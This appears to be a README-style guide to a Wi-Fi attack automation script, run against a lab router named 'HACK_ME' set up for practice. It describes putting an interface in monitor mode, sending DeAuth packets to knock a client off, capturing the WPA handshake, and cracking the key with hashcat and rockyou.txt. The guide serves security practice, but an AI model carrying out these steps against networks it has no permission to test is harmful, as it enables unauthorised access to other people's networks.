# Detailed Instructions for Using the "wifi-attack-automation-tool"

Before running the script `wifi-attack-automation-tool.py`, it is essential to have **root privileges**, as the applications used by the script require these permissions.

Once the necessary privileges have been obtained, proceed to execute the script using the following command:

```
# wifi-attack-automation-tool.py
```

The script itself will verify whether the required **Python packages and system tools** are installed for proper operation.

```
# ./wifi-attack-automation-tool.py

```

Next, a list of available **network interfaces capable of monitor mode** will be displayed. You must select the desired one; in our case, it is the interface named `wlx00e0202d05b8`, so we choose **option number 1**.

At this point, the script will:
- Configure the selected interface in **monitor mode**.
- Prepare the environment to scan available wireless networks, including:
  - Access Points (AP)
  - Devices connected to them.

```
Select an interface by number: 1

```

After pressing [Enter], `airodump-ng` starts to run in order to begin analyzing WiFi devices connected to access points.

Once the **target network** has been identified (for example, the AP `HACK_ME` with BSSID `EC:BE:DD:AD:08:96`), we also select the **associated device** to which we will send **DeAuth packets**. In this example, the device `F6:B1:11:45:98:25`.

The objective is to **force its disconnection** in order to capture the **handshake** when it attempts to reconnect.

By stopping the scan with `Ctrl+C`, the script will analyze the devices connected to valid access points and display a list of them.

Next, we need to specify **how many DeAuth packets** we want to send:
- If no value is entered, the **default** is **25 packets**.
- By default, they will be sent **every 0.5 seconds**.

Once the number of packets is confirmed:
- A process will open using `airodump-ng` to **listen on the channel** corresponding to the selected AP (in this example, **channel 9**).
- Simultaneously, another process will start to **send the DeAuth packets**.

The next step is to select the wordlist you want to use for brute force:

```

[2025-06-27 20:28:36.500] <inf> 5. No search password
Select the wordlist you want to use: 1
```

Once you have selected the wordlist, and with the hash file ready, the tool `hashcat` will be used along with the password list `rockyou.txt` to **perform a brute-force attack** in an attempt to **crack the password**.

> ‚è≥ **Note:** The time required will depend on the size of the wordlist.

```

```

Finally, if the process is successful, the **recovered password will be displayed** (for example, `pipeylaura`).

As a **final step**, the script will **return the WiFi interface to its original state**.

```

## Additional Notes

- **Note 1:** It is recommended to run the script within a **Python virtual environment** to avoid dependency conflicts.

- **Note 2:** The router with SSID `HACK_ME` has been prepared **exclusively for this practice**.
  - **Security:** WPA + WPA2
  - **Key:** Randomly selected from the `rockyou.txt` wordlist: pipeylaura
